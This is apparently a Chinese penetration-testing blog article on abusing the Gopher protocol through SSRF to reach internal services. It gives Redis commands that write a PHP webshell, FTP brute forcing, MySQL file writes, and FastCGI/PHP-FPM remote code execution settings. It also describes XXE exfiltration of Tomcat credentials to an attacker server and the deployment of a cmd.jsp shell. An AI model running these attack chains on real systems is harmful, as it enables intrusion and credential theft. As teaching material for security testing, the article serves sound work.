Gopher协议使用总结
原创六号刃部 酒仙桥六号部队
2020-08-20原文
这是 酒仙桥六号部队 的第 64 篇文章。
全文共计3714个字，预计阅读时长12分钟。
什么是Gopher协议？
Gopher协议是一个通信协议，它用来设计，分配，搜索与检索文档
中的internet协议的网络。在超文本传输协议（http）出现之前，
它是internet上最重要的信息检索工具，gopher生态系统被认为
是万维网的前身。
Gopher 这 个 名 字 是 由 在 明 尼 苏 达 大 学 的 Anklesaria
命名的，它的名字由来是这样的：
1. 明尼苏达大学的吉祥物是地鼠。
2. 一个跑腿的助手就像地鼠一样在地下挖洞总能到达它想要的位置
。
由于可以GET、POST请求，那可以先截获get请求包和post请求包
，再构造成符合gopher协议的请求，利用Gopher我们可以对FTP，
Telnet ， Redis ， Memcache ， 基 于 一 个 TCP 包 的
exploit等等进行内网攻击，这样极大的拓宽了我们的攻击面。
Gopher协议格式
Gopher默认端口是70：
URL:gopher://:/
可以是下面其中之一的格式：
%09
%09%09
如果省略，则端口默认为70。是一个单字符
字段，表示URL所引用资源的Gopher类型。
整 个 也可以为空，在这种情况下，定界“/”也是可以为空，并且
默认为“ 1”。
是Gopher选择器字符串。在Gopher协议中，Gopher
选择器字符串是一个八位字节序列，可以包含除09十六进制（US-
ASCIIHT或制表符），0A十六进制（US-ASCII字符LF）和0D（US-
ASCII字符CR）之外的任何八位字节。
 用 于 向 gopher
搜索引擎提交搜索数据，和之间用%09隔开。
Gopher客户端通过将Gopher字符串发送到Gopher服
务器来指定要检索的项目。
如何转换规则
我们先随意构造一个简单php代码
我们构造一个GET包。
虽然Burp帮我们GET那么多参数，我们可以缩到3行。
GET /edit.php?a=Hi HTTP/1.1
Host: 127.0.0.1
Connection: close
转换规则
1.如果第一个字符是>或者
注意php.in 要开启extension=php_curl.dll
Php版本>5.3 (gopher协议在5.3版本以上才开始支持)
攻击机监听本地4444端口，同时浏览器访问：
192.168.11.1/ssrf2.php?url=gopher://192.168.11.130:4444/_hello
记得要在传输的数据前加一个无用字符。
收到传输过来的字符那么说明没有问题。
FTP爆破
内网中存在弱口令的FTP比较多，我们可以尝试一下。
攻击机IP：192.168.11.130
SSRF服务器IP：192.168.1.11
FTP服务器IP：192.168.11.136
首先，先在FTP的服务器上测试一下访问FTP的流量情况，对其进行
抓包处理。
curl ftp://vsftp:vsftp@127.0.0.1/ 【vsftp账号：vsftp密码】
右键 Follow tcp steam ,保存为ASCII格式,这里我们只保留
USER PASSQUIT这3个字符用于加快爆破返回速度。
按照规则转换成gopher码，再放入BP中需要对其进行一次转码进行
爆破。
REDIS
常见的写入webshell脚本。
flushall
set 1 ''
config set dir /www/wwwroot/
config set dbfilename shell.php
save
用wireshark捕捉lo0，再写入：
右键定位tcp跟踪流：
按之前的方法转换成gopher码后，成功生成shell.php。
当然我们也可以利用gopherus直接生成gopher码
https://github.com/tarunkant/Gopherus
成功执行，可以用蚁剑连接。
Redis 未授权访问除了Webshell之外 ，我们也可以使用 crontab 反弹
shell，利用公私钥直接登录目标服务器，主从模式等。
MYSQL
MYSQL认证模式有2种
1. 密码认证，这种使用挑战应答模式，服务器会先对密码加salt之
后再进行验证。
2. 无需密码认证，直接发送数据包即可。
MYSQL还有3种连接方式：
1. Unix套接字，这种用于linux或者unix环境下且client和serv
er端需要在一台电脑中。
2. 内存共享或者命名管道。这种用于windows环境下且clent和se
rver端在一台电脑中。
3. TCP/IP，网络传输协议，使用的最多的一种连接方式。
那么在非交互下我们可以使用TCP/IP 无密码认证来实现攻击。
先创建1个无密码的本地登录用户，再进行抓包处理。
客户端输入：
mysql -h 127.0.0.1 -u ssrf -p
show version();
exit;
将得到的抓包文件同理进行过滤成tcp流 raw格式。
再将进行一次urlencode格式转换。成功得到版本信息。
我们这里也可以用https://github.com/FoolMitAh/mysql_gop
her_attack 实现。
我们这里尝试写入phpinfo文件。
前提是我们需要足够有写入的文件权限，以及将-sercure-file-
priv其修改为空，不然只能导入到指定的位置。
如新版本mysql强制导出文件到指定文件，需要对其进行添加新路径
。
eg: python exploit.py -u root -p "" -d "" -P "PAYLOAD" -v -c
FAST CGI
FastCGI （ Fast Common
GatewayInterface）全称是“快速通用网关接口”，是通用网关
接口（CGI）的增强版本，由CGI发展改进而来，主要用来提高CGI
程序性能，类似于CGI，FastCGI也是一种让交互程序与Web服务器
通信的协议。
Fastcgi协议由多个record组成，其中recoed包含header和body
。服务器中间件将header和body按照fastcgi的规则封装好通过tc
p发送给FPM（Fastcgi协议解析器），FPM解码后将结果再封装后
返回给中间件。
其中FPM按照fastcgi的协议将TCP流解析成真正的数据。
举个例子，用户访问http://127.0.0.1/index.php?a=1&b=2，
如果web目录是/var/www/abc，那么Nginx会将这个请求变成如下
key-value对：
{
'GATEWAY_INTERFACE': 'FastCGI/1.0',
'REQUEST_METHOD': 'GET',
'SCRIPT_FILENAME': '/var/www/abc/index.php',
'SCRIPT_NAME': '/index.php',
'QUERY_STRING': '?a=1&b=2',
'REQUEST_URI': '/index.php?a=1&b=2',
'DOCUMENT_ROOT': '/var/www/abc',
'SERVER_SOFTWARE': 'php/fcgiclient',
'REMOTE_ADDR': '127.0.0.1',
'REMOTE_PORT': '12345',
'SERVER_ADDR': '127.0.0.1',
'SERVER_PORT': '80',
'SERVER_NAME': "localhost",
'SERVER_PROTOCOL': 'HTTP/1.1'
}
FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。
然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/w
ww/abc/index.php。
也 就 是 说 php-
fpm根据script_filename的值来执行php文件。如果该文件不存
在，则返回404。
大致原理：
1.NGINX与IIS7曾出现php解析漏洞，例如访问http://127.0.0.
1/1.jpg/.php则访问的文件是1.jpg，却按照.php解析。
由于php中的fix_pathinfo特性，如果地址路径为/var/www/abc
。它会先判断SCRIPT_FILENAME即/var/www/abc/1.jpg/.php是
否存在，如果不存在则去掉最后一个/和后面的内容，判断/var/ww
w/abc/1.jpg是否存在，如果存在则按照php来解析。
2.PHP.INI中有两个配置项，auto_prepend_file和auto_appen
d_file。可以将文件require到所有页面的顶部与底部。
auto_prepend_file是在执行目标之前先包含auto_prepend
_file中指定的文件,我们可以将auto_prepend_file设定为p
hp://input，auto_append_file是执行完成目标文件后，包
含auto_append_file指向的文件。
其中FPM还有2个变量需要如下设置PHP_VALUE和PHP_ADMIN_V
ALUE。
分别设置为：
'PHP_VALUE': 'auto_prepend_file = php://input'，
'PHP_ADMIN_VALUE': 'allow_url_include = On'
利用条件：
 libcurl版本>=7.45.0(由于EXP里有%00，CURL版本小于7.45
.0的版本，gopher的%00会被截断)
 PHP-FPM监听端口
 PHP-FPM版本 >= 5.3.3
 知道服务器上任意一个php文件的绝对路径
FastCGI 基 本 都 在 本 地 127.0.0.1
端口上的，这里用P神脚本尝试执行。
https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75
我们将其转换成gopher，先监听2333端口。
再执行脚本。
得到的脚本进行简单的urlencode转换。
执行即可:
curl -v
‘gopher://127.0.0.1:9000/_[上面生成payload]’
我们可以利用gopherus直接生成gopher码
下图可以直接进行命令执行。
XXE
我 们 这 边 模 拟 一 个 JAVA-
XXE 的 环 境 用 XXE 来 读 取 其 中 的 TOMCAT 账 号 密 码
，最后用gopher来执行RCE。
存在XXE 服务器IP:192.168.11.139
攻击服务器IP:192.168.11.130
环境https://github.com/pimps/docker-java-xxe
这 里 搭 建 完 后 有 个 小 BUG ， 需 要 将 app 中 index.htmlxxe-
example.war拷贝到子目录xxe-example。
我们先测试xxe是否能读取出XXE漏洞服务器本地密码。
这里访问192.168.11.139:8080并构建XXE，
]>
&xxe;
31337
Jon Snow
我 们 接 下 来 读 取 tomcat 里 面 的 tomcat-
user.xml数据并将其传递给远程的攻击服务器。
提供ftp服务和web服务的服务器，FTP负责接受外部的DTD数据，W
EB提供接受FTP的payload。
环境https://github.com/staaldraad/xxeserv
编写一个外部的dtd。
./xxeserv -wp 4444 -w -p[-wp为开启web并修改web端口 -p开启FTP端口]
尝试读取tomcat-user.xml里面的账户密码。
构建XXE：
%sp;
%param3;
%exfil;
]>
OOB EXFILL
31337
xxx
使用脚本执行一键RCE。
脚本https://github.com/pimps/gopher-tomcat-deployer
我们用刚才读取出的账号密码构建：：
python gopher-tomcat-deployer.py -u admin -p admin -t 127.0.0.1
-pt 8080 cmd.jsp
将生成的gopher导入payload 中：
成功生成cmd目录和cmd.jsp并能执行命令。
总结
虽然Gopher协议已经渐渐退出了历史的舞台，但是对渗透来说仍然
是个不可低估的协议。它总能扩大思维结合其他漏洞进行许多拓展
攻击。
参考链接：
https://en.wikipedia.org/wiki/Gopher_(protocol
https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html
https://joychou.org/web/phpssrf.html
https://blog.chaitin.cn/gopher-attack-surfaces/
https://staaldraad.github.io/2016/12/11/xxeftp/
精选留言
用户设置不下载评论